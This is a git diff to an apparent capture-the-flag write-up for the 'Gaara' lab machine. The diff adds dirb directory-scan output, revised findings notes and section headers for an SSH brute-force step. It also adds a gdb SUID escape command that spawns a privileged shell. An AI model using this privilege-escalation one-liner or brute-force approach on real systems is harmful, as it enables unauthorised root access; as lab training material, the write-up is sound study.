@@ -49,16 +49,43 @@ Nmap done: 1 IP address (1 host up) scanned in 16.33 seconds
 
 ![gara-sourcepage-proving-ground](https://user-images.githubusercontent.com/98345027/188297913-055bb220-b7c9-45b0-9e8c-3c007b62e8a5.png)
 
+## Dirb
+```python
+Note: Checking for hidden directories
+======================================
+┌──(dx㉿kali)-[~]
+└─$ dirb http://192.168.114.142
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Sun Sep  4 00:40:50 2022
+URL_BASE: http://192.168.114.142/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+-----------------
+
+GENERATED WORDS: 4612
+
+---- Scanning URL: http://192.168.114.142/ ----
++ http://192.168.114.142/index.html (CODE:200|SIZE:137)                     
++ http://192.168.114.142/server-status (CODE:403|SIZE:280)
+```
+
 # FINDINGS-PORT:80
 ```javascript
-1. Nothing found on the webpage and in source page just a simple image
+1. Nothing found on the webpage and in source page, just a simple image
+2. Nothing found any useful information from Dirb Result
 2. It seems that username is "gaara"
 ```
 
+# Navigating To Port:21
 
-# Exploitation
+## Exploitation
 
-## SSH-Brute Force
+### SSH-Brute Force
 
 ```javascript
 Note: 
@@ -152,9 +179,11 @@ gaara@Gaara:~$ find / -perm -u=s -type f 2>/dev/null
 ```
 ## Note
 ```javascript
-1.  (/usr/bin/gdb) show the SUID bit  from GFTobins(https://gtfobins.github.io/gtfobins/gdb/#suid) among the rest of the result 
+0.  From the above result we check each of them in GFTO-bins website for SUID bitset but none of them show  the Result  except /usr/bin/gdb
+1.  (/usr/bin/gdb) show the SUID bit  from GFTobins(https://gtfobins.github.io/gtfobins/gdb/#suid)
 2.  Since gdb is already present in /usr/bin/gdb.
 3.  So From the GFToBins we have change the "./gdb" ----> "/usr/bin/gdb" by the following code
+4. For Example:  /usr/bin/gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh","-p")' -ex quit
 
 ```
 ## Root
